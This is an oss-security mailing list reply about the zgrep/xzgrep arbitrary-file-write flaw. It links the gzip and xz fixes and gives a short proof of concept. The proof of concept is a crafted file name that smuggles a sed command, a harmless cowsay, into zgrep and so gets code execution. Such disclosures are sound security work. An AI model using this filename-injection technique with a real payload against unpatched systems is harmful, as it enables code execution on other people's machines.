Received: (qmail 27783 invoked by uid 550); 8 Apr 2022 08:23:43 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 27758 invoked from network); 8 Apr 2022 08:23:43 -0000
Authentication-Results: garm.ovh; auth=pass (GARM-100R003f4d694a4-341d-445e-a49c-5ee4674ded80,
                    4CA5D0370629681252F7247E7938CA4FDE58D5C5) smtp.auth=jwilk@jwilk.net
X-OVh-ClientIp: 5.172.255.163
Date: Fri, 8 Apr 2022 10:23:29 +0200
From: Jakub Wilk <jwilk@jwilk.net>
To: <oss-security@lists.openwall.com>
Message-ID: <20220408082329.o5ce7giuals7rd7h@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <m2o81c3f8r.fsf@meyering.net>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"; format=flowed
Content-Disposition: inline
In-Reply-To: <m2o81c3f8r.fsf@meyering.net>
X-Originating-IP: [37.59.142.100]
X-ClientProxiedBy: DAG5EX2.mxp6.local (172.16.2.42) To DAG4EX2.mxp6.local
 (172.16.2.32)
X-Ovh-Tracer-GUID: ddd9e197-05d5-4161-814c-97d4970b52cf
X-Ovh-Tracer-Id: 17366724590198249239
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgedvvddrudektddgtddvucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecuhedttdenucenucfjughrpeffhffvuffkfhggtggujghisehttdertddttddvnecuhfhrohhmpeflrghkuhgsucghihhlkhcuoehjfihilhhksehjfihilhhkrdhnvghtqeenucggtffrrghtthgvrhhnpeehkeeftddtkedvhfetteeuheeuvdeghfeigeduteeiveekieffkeelgeefkeejfeenucffohhmrghinhepthhukhgrrghnihdrohhrghdpghhnuhdrohhrghenucfkpheptddrtddrtddrtddpfeejrdehledrudegvddruddttdenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhhouggvpehsmhhtphhouhhtpdhhvghlohepmhigphhlrghniedrmhgrihhlrdhovhhhrdhnvghtpdhinhgvtheptddrtddrtddrtddpmhgrihhlfhhrohhmpehjfihilhhksehjfihilhhkrdhnvghtpdhnsggprhgtphhtthhopedupdhrtghpthhtohepohhsshdqshgvtghurhhithihsehlihhsthhsrdhophgvnhifrghllhdrtghomh
Subject: Re: [oss-security] zgrep, xzgrep: arbitrary-file-write vulnerability

* Jim Meyering <jim@meyering.net>, 2022-04-07, 11:44:
>All previous versions of gzip and xzutils are affected.
>
>xzutils released this patch today:
>
>  https://tukaani.org/xz/xzgrep-ZDI-CAN-16587.patch
>  https://tukaani.org/xz/xzgrep-ZDI-CAN-16587.patch.sig
>
>gzip-1.12 was released today, with the fix:
>
>  https://lists.gnu.org/r/bug-gzip/2022-04/msg00011.html
>  https://ftp.gnu.org/gnu/gzip/gzip-1.12.tar.xz
>  https://ftp.gnu.org/gnu/gzip/gzip-1.12.tar.xz.sig

As mentioned in the xz patch, if you have GNU sed, you get not just file 
write, but direct code execution.

PoC:

    $ touch foo.gz
    $ echo foo | gzip > "$(printf '|\n;e cowsay pwned\n#.gz')"
    $ zgrep foo *.gz
     _______
    < pwned >
     -------
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||
    foo

-- 
Jakub Wilk
